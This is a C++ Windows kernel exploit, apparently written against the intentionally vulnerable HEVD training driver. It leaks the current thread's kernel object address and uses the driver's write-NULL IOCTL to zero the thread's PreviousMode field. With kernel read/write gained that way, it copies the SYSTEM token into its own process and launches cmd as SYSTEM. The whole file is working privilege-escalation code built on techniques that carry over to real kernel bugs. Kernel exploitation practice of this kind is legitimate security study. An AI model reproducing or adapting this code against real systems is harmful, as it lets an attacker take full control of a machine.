// NonPagedPoolOverflow.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <Windows.h>
#include <stdio.h>
#include "hevd.hpp"
#include "Hexdump.hpp"
#include "Header.hpp"
#include <iostream>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

#define PREVIOUS_MODE_OFFSET 0x232
#define TOKEN_OFFSET 0x4b8

HANDLE openDevice() {
    return CreateFileA(kDevName, GENERIC_READ | GENERIC_WRITE, NULL, NULL, OPEN_EXISTING, NULL, NULL);
}

void closeDevice(HANDLE device) {
    CloseHandle(device);
}

PVOID leakKernelObjectAddr(HANDLE handle, DWORD pid) {
	NTSTATUS status;
	SYSTEM_HANDLE_INFORMATION localHandleInfoObj;
	PSYSTEM_HANDLE_INFORMATION handleInfo;
	ULONG handleInfoSize;
	PVOID result = NULL;
	status = NtQuerySystemInformation(SystemHandleInformation, &localHandleInfoObj, sizeof(localHandleInfoObj), &handleInfoSize);
	if (status != STATUS_INFO_LENGTH_MISMATCH) {
		printf("Can't get handle table size. Error: %llx\n", status);
		return NULL;
	}
	handleInfoSize += 100 * sizeof(SYSTEM_HANDLE_TABLE_ENTRY_INFO);	// add a bit as extra
	handleInfo = (PSYSTEM_HANDLE_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, handleInfoSize);
	status = NtQuerySystemInformation(SystemHandleInformation, handleInfo, handleInfoSize, NULL);
	if (status != STATUS_SUCCESS) {
		printf("Can't query handle table. Error: %llx\n", status);
		HeapFree(GetProcessHeap(), 0, handleInfo);
		return NULL;
	}

	for (int i = 0; i < handleInfo->NumberOfHandles; i++)
	{
		//
		// Check if this is the correct I/O ring handle
		//
		if ((handleInfo->Handles[i].UniqueProcessId == pid) &&
			((HANDLE)handleInfo->Handles[i].HandleValue == handle))
		{
			//printf("[*] Found object address: 0x%p\n", handleInfo->Handles[i].Object);
			//printf("%hhd\n", handleInfo->Handles[i].ObjectTypeIndex);
			result = handleInfo->Handles[i].Object;
			break;
		}
	}
	HeapFree(GetProcessHeap(), 0, handleInfo);
	return result;
}

void arbitraryRead(PVOID addr, QWORD size, PVOID out) {
	BOOLEAN status = ReadProcessMemory(GetCurrentProcess(), addr, out, size, NULL);
	if (status) {
		printf("[*] Read from: 0x%p\n", addr);
		std::cout << Hexdump(out, size) << std::endl;
	}
	else {
		puts("[*] Failed to read");
	}
}

void arbitraryWrite(PVOID addr, char* data, QWORD size) {
	// Can't use WriteProcessMemory() directly because internally, it calls NtQueryVirtualMemory()
	// NtQueryVirtualMemory() will checks if our address is > 0x7FFFFFFEFFFF (usermode address limit) regardless of PreviousMode on Ethread
	// Use NtWriteVirtualMemory() directly. Ref: https://github.com/xct/windows-kernel-exploits/blob/main/windows-exploits/HevdStackOverflowRopMI.cpp#L47
	_NtWriteVirtualMemory pNtWriteVirtualMemory = (_NtWriteVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWriteVirtualMemory");

	NTSTATUS status = pNtWriteVirtualMemory(GetCurrentProcess(), addr, data, size, NULL);
	if (status != STATUS_SUCCESS) {
		printf("[!] Failed to write to: 0x%llx. Error: 0x%llx\n", addr, status);
	}
}

int main()
{
    // Use a write null vuln to write the previousMode field of _ETHREAD to 0
    // This should give us arbitrary read/write of kernel memory --> use it to swap token
	//Sleep(5000);
    HANDLE device = openDevice();
    if (device == INVALID_HANDLE_VALUE) {
        puts("Failed to open");
        return 1;
    }
	NTSTATUS status;
	HRESULT result;
	BOOLEAN boolStat;
	PVOID systemEprocess, targetEprocess;
	char cleanup = 1;

	HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, GetCurrentProcessId());
	HANDLE hThread = OpenThread(THREAD_QUERY_INFORMATION, FALSE, GetCurrentThreadId());
	if (!hThread) {
		puts("[!] Failed to get current thread handle");
		return 1;
	}
	PVOID eThreadAddr = leakKernelObjectAddr(hThread, GetCurrentProcessId());
	printf("[*] Leaked _ETHREAD: %p\n", eThreadAddr);
	if (eThreadAddr == NULL) {
		puts("[!] Failed to leak ETHREAD");
		return 1;
	}
	QWORD targetAddr = (QWORD)eThreadAddr + PREVIOUS_MODE_OFFSET;
	printf("[*] Write NULL at: 0x%p\n", targetAddr);
	boolStat = DeviceIoControl(device, HEVD_IOCTL_WRITE_NULL, &targetAddr, 8, NULL, 0, NULL, NULL);
	if (!boolStat) {
		puts("[!] Can't overwrite PreviousMode");
		goto EXIT;
	}
	systemEprocess = leakKernelObjectAddr((HANDLE)4, 4);
	targetEprocess = leakKernelObjectAddr(hProc, GetCurrentProcessId());
	if (!systemEprocess || !targetEprocess) {
		puts("[!] Failed to leak EPROCESS structs");
		arbitraryWrite((PVOID)targetAddr, &cleanup, 1);
		return 1;
	}
	// Swap token
	char token[8];
	arbitraryRead((char*)systemEprocess + TOKEN_OFFSET, 8, token);
	arbitraryWrite((char*)targetEprocess + TOKEN_OFFSET, token, 8);
	// According to: https://github.com/xct/windows-kernel-exploits/blob/main/windows-exploits/HevdStackOverflowRopMI.cpp#L139 and debugging
	// If we start a new process with PreviousMode still 0, there will be an access violation exception	
	// Exception happens at >>> PspLocateInPEManifest+0x9b: bts     dword ptr [rax+8],0Dh
	arbitraryWrite((PVOID)targetAddr, &cleanup, 1);
	system("cmd");

EXIT:
	CloseHandle(hThread);
	CloseHandle(hProc);
    closeDevice(device);
}


